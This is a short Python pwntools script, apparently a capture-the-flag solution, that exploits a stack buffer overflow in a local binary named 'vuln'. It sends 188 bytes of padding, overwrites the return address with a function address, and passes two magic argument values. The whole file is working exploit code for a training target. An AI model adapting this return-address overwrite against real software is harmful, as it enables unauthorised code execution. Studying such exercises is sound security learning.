#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Please enter your string: \n")

payload = (
    "A" * 188 +
    p32(0x80485e6) +
    "BBBB" +
    p32(0xDEADBEEF) +
    p32(0xC0DED00D)
)

r.sendline(payload)
print(r.recvall())

r.close()
